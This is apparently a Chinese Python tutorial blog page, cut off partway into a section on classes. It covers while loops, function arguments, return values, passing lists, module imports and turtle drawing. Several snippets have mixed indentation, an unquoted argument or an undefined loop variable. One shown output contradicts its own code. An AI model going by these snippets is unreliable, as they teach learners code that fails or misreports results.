<h4 id="remove-删除列表中的特定值"><a href="#remove-删除列表中的特定值" class="headerlink" title="remove()删除列表中的特定值"></a>remove()删除列表中的特定值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">pets = [<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pets)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">in</span> pets:<span class="comment">#循环检查cat是否在列表中</span></span><br><span class="line">    pets.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(pets)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="使用while循环操作字典"><a href="#使用while循环操作字典" class="headerlink" title="使用while循环操作字典"></a>使用while循环操作字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mountain_poll.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">responses = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志，指出调查是否继续</span></span><br><span class="line">polling_active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line">	<span class="comment"># 提示输入被调查者的名字和回答</span></span><br><span class="line">	name = <span class="built_in">input</span>(<span class="string">&quot;\nWhat is your name? &quot;</span>)</span><br><span class="line">	response = <span class="built_in">input</span>(<span class="string">&quot;Which mountain would you like to climb someday? &quot;</span>)</span><br><span class="line">	<span class="comment"># 将答卷存储在字典中</span></span><br><span class="line">	responses[name] = response</span><br><span class="line">	<span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line"> 	repeat = <span class="built_in">input</span>(<span class="string">&quot;Would you like to let another person respond? (yes/ no) &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> repeat == <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">	polling_active = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--- Poll Results ---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name, response <span class="keyword">in</span> responses.items():</span><br><span class="line">	<span class="built_in">print</span>(name + <span class="string">&quot; would like to climb &quot;</span> + response + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">Which mountain would you like to climb someday? Denali</span><br><span class="line">Would you like to <span class="built_in">let</span> another person respond? (<span class="built_in">yes</span>/ no) <span class="built_in">yes</span></span><br><span class="line">What is your name? Lynn</span><br><span class="line">Which mountain would you like to climb someday? Devil<span class="string">&#x27;s Thumb</span></span><br><span class="line"><span class="string">Would you like to let another person respond? (yes/ no) no</span></span><br><span class="line"><span class="string">--- Poll Results ---</span></span><br><span class="line"><span class="string">Lynn would like to climb Devil&#x27;</span>s Thumb.</span><br><span class="line">Eric would like to climb Denali.</span><br></pre></td></tr></table></figure>





<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="def语句定义函数"><a href="#def语句定义函数" class="headerlink" title="def语句定义函数"></a>def语句定义函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeter_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello@&quot;</span>+username)</span><br><span class="line"></span><br><span class="line">greeter_user(敬请T期待)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello@敬请T期待</span><br></pre></td></tr></table></figure>

<h3 id="位置实参"><a href="#位置实参" class="headerlink" title="位置实参"></a>位置实参</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>, <span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递实参hamster,harry</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I have a hamster.</span><br><span class="line">My hamster<span class="string">&#x27;s name is Harry.</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>传递实参时需要注意传递的实参的位置，不能随意变换</p>
</blockquote>
<h3 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递关键字实参</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I have a harry.</span><br><span class="line">My harry<span class="string">&#x27;s name is Hamster.</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>关键字实参的顺序无关紧要</p>
</blockquote>
<h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><blockquote>
<p>编写函数时，可给每个形参指定默认值。在调用函数中给形参提供了实参时，Python将使用指定的实参值；否则，将使用形参的默认值。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">pet_name, animal_type=<span class="string">&#x27;dog&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)<span class="comment">#当使用位置关键字时，只有一个实参，默认为pet_name</span></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I have a dog.</span><br><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">I have a hamster.</span></span><br><span class="line"><span class="string">My hamster&#x27;</span>s name is harry.</span><br></pre></td></tr></table></figure>

<ul>
<li>等效的函数调用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一条名为Willie的小狗</span></span><br><span class="line">describe_pet(<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line"><span class="comment"># 一只名为Harry的仓鼠</span></span><br><span class="line">describe_pet(<span class="string">&#x27;harry&#x27;</span>, <span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="实参可选择化"><a href="#实参可选择化" class="headerlink" title="实参可选择化"></a>实参可选择化</h3><blockquote>
<p>使用空字符串，将实参进行可选择处理</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name, middle_name=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;注意:可选择的空字符串需要放在后面的位置&quot;&quot;&quot;</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line"> 	<span class="keyword">if</span> middle_name:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + middle_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">	<span class="keyword">return</span> full_name.title()</span><br><span class="line"></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;hooker&#x27;</span>, <span class="string">&#x27;lee&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<h3 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h3><blockquote>
<p>形参名*toppings中的星号让Python创建一个名为toppings的空元组，并将收到的所有值都封<br>装到这个元组中。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">*toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br><span class="line">   </span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mushrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure>



<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#formatted_name.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line">	full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">	<span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jimi Hendrix</span><br></pre></td></tr></table></figure>

<h4 id="函数返回字典"><a href="#函数返回字典" class="headerlink" title="函数返回字典"></a>函数返回字典</h4><blockquote>
<p>函数可返回任何类型的值，包括列表和字典等较复杂的数据结构。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#person.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_person</span>(<span class="params">first_name, last_name, age=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回一个字典，其中包含有关一个人的信息&quot;&quot;&quot;</span></span><br><span class="line">	person = &#123;<span class="string">&#x27;first&#x27;</span>: first_name, <span class="string">&#x27;last&#x27;</span>: last_name&#125;</span><br><span class="line">	<span class="keyword">if</span> age:</span><br><span class="line">	person[<span class="string">&#x27;age&#x27;</span>] = age</span><br><span class="line">	<span class="keyword">return</span> person</span><br><span class="line">musician = build_person(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>, age=<span class="number">27</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;hendrix&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="返回值搭配while循环"><a href="#返回值搭配while循环" class="headerlink" title="返回值搭配while循环"></a>返回值搭配while循环</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line">	full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nPlease tell me your name:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(enter &#x27;q&#x27; to any time to quit)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    f_name=<span class="built_in">input</span>(<span class="string">&quot;First name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    l_name=<span class="built_in">input</span>(<span class="string">&quot;Last name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> l_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    formatted_name = get_formatted_name(f_name,l_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nHello,&quot;</span>+formatted_name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: eric</span><br><span class="line">Last name: matthes</span><br><span class="line">Hello, Eric Matthes!</span><br><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: q</span><br></pre></td></tr></table></figure>

<h3 id="传递列表"><a href="#传递列表" class="headerlink" title="传递列表"></a>传递列表</h3><h4 id="向函数中传递列表"><a href="#向函数中传递列表" class="headerlink" title="向函数中传递列表"></a>向函数中传递列表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_users.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet_users</span>(<span class="params">names</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;向列表中的每一位用户发出简单的问候&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">&quot;Hello,&quot;</span> + name.title() + <span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">usernames = [<span class="string">&#x27;hannah&#x27;</span>,<span class="string">&#x27;ty&#x27;</span>,<span class="string">&#x27;margot&#x27;</span>,<span class="string">&#x27;敬请T期待&#x27;</span>]</span><br><span class="line">greet_users(usernames)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello, Hannah!</span><br><span class="line">Hello, Ty!</span><br><span class="line">Hello, Margot!</span><br><span class="line">Hello, 敬请T期待!</span><br></pre></td></tr></table></figure>

<h3 id="在函数中修改列表"><a href="#在函数中修改列表" class="headerlink" title="在函数中修改列表"></a>在函数中修改列表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models.py</span></span><br><span class="line"><span class="comment">#首先创建一个列表，其中包含一些要打印的设计</span></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#模拟打印每一个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="comment">#打印每一个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="keyword">while</span> unprinted_designs:</span><br><span class="line">    current_design = unprinted_designs.pop()</span><br><span class="line">    <span class="comment">#模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Printing model:&quot;</span> + current_design)</span><br><span class="line">    completed_models.append(current_design)</span><br><span class="line"><span class="comment">#显示打印好的所有模型</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> completed_models <span class="keyword">in</span> completed_models:</span><br><span class="line">    <span class="built_in">print</span>(completed_model)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Printing model: dodecahedron</span><br><span class="line">Printing model: robot pendant</span><br><span class="line">Printing model: iphone case</span><br><span class="line"></span><br><span class="line">The following models have been printed:</span><br><span class="line">dodecahedron</span><br><span class="line">robot pendant</span><br><span class="line">iphone case</span><br></pre></td></tr></table></figure>

<p>提高效率版</p>
<blockquote>
<p>每个函数都应只负责一项具体的工作。第一个函数打印每个设计，而第二个显示打印好的模型；这优于使用一个函数来完成两项工作。编写函数时，如果你发现它执行的任务太多，请尝试将这些代码划分到两个函数中。别忘了，总是可以在一个函数中调用另一个函数，这有助于将复杂的任务划分成一系列的步骤。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models()</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_models</span>(<span class="params">unprinted_designs, completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    模拟打印每个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="string">    打印每个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> unprinted_designs:</span><br><span class="line">        current_design = unprinted_designs.pop()</span><br><span class="line">        <span class="comment"># 模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Printing model: &quot;</span> + current_design)</span><br><span class="line">		completed_models.append(current_design)</span><br><span class="line"><span class="comment">#show_completed_models()    </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_completed_models</span>(<span class="params">completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示打印好的所有模型&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> completed_model <span class="keyword">in</span> completed_models:</span><br><span class="line">        <span class="built_in">print</span>(completed_model)</span><br><span class="line"></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line">print_models(unprinted_designs, completed_models)</span><br><span class="line">show_completed_models(completed_models)</span><br></pre></td></tr></table></figure>

<h4 id="传递列表副本"><a href="#传递列表副本" class="headerlink" title="传递列表副本"></a>传递列表副本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function_name(list_name[:])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>切片表示法[:]创建列表的副本。向函数传递列表的副本可保留原始列表的内容。</p>
<p>但除非有充分的理由需要传递副本，否则还是应该将原始列表传递给函数，因为让函数使用现成列表可避免花时间和内存创建副本，从而提高效率，在处理大型列表时尤其如此。</p>
</blockquote>
<h3 id="将函数存储在模块中"><a href="#将函数存储在模块中" class="headerlink" title="将函数存储在模块中"></a>将函数存储在模块中</h3><h4 id="import导入整个模块"><a href="#import导入整个模块" class="headerlink" title="import导入整个模块"></a>import导入整个模块</h4><blockquote>
<p>模块是扩展名为.py的文件，包含要导入到程序中的代码。</p>
</blockquote>
<blockquote>
<p>import 导入外部模块，但是需要用‘.语句’来调用函数</p>
<p><strong>module_name</strong>.**function_name()**调用模块内的函数；</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">size, *toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a &quot;</span> + <span class="built_in">str</span>(size) +<span class="string">&quot;-inch pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">   		<span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在pizza.py所在的目录中创建另一个名为making_pizzas.py的文件，这个文件导入刚创建的模块，再调用make_pizza()两次：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line"></span><br><span class="line">pizza.make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">pizza.make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Making a 16-inch pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a 12-inch pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure>

<h4 id="导入特定的函数"><a href="#导入特定的函数" class="headerlink" title="导入特定的函数"></a>导入特定的函数</h4><p>从模块中导入特定的一个函数</p>
<blockquote>
<p>利用 <strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_named</u></p>
</blockquote>
<p>通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数：</p>
<blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_0</u>, <u>function_1</u>, <u>function_2</u></p>
</blockquote>
<h4 id="使用-as-给函数指定别名"><a href="#使用-as-给函数指定别名" class="headerlink" title="使用 as 给函数指定别名"></a>使用 as 给函数指定别名</h4><blockquote>
<p> 如果要导入的函数的名称可能与程序中现有的名称冲突，或者函数的名称太长，可指定简短而独一无二的别名——函数的另一个名称，类似于外号。要给函数指定这种特殊外号，需要在导入它时这样做。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#turtle.py</span></span><br><span class="line"><span class="comment">#导入turtle库画一个正方形</span></span><br><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line">color = [<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;purple&#x27;</span>,<span class="string">&#x27;#33cc8c&#x27;</span>]</span><br><span class="line">t.penup()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.goto(-<span class="number">100</span>,-<span class="number">100</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t.pencolor(color[i])</span><br><span class="line">    t.forward(<span class="number">200</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">t.fillcolor(<span class="string">&#x27;pink&#x27;</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.down()</span><br></pre></td></tr></table></figure>



<img src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/turtle%E7%A4%BA%E4%BE%8B.png" alt="truele" style="zoom:80%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*— coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> make_pizza <span class="keyword">as</span> mp</span><br><span class="line">mp(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">mp(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="导入模块中的所有函数"><a href="#导入模块中的所有函数" class="headerlink" title="导入模块中的所有函数"></a>导入模块中的所有函数</h4><blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> *</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> *</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="创建和使用类"><a href="#创建和使用类" class="headerlink" title="创建和使用类"></a>创建和使用类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">	<span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">       <span class="comment">#注意:init左右两边各有2个”_&quot;是&quot;__&quot;不是&quot;_&quot;</span></span><br><span class="line">   	<span class="string">&quot;&quot;&quot;初始化属性name和age&quot;&quot;&quot;</span></span><br><span class="line">    	self.name = name</span><br><span class="line">   	self.age = age</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">   	<span 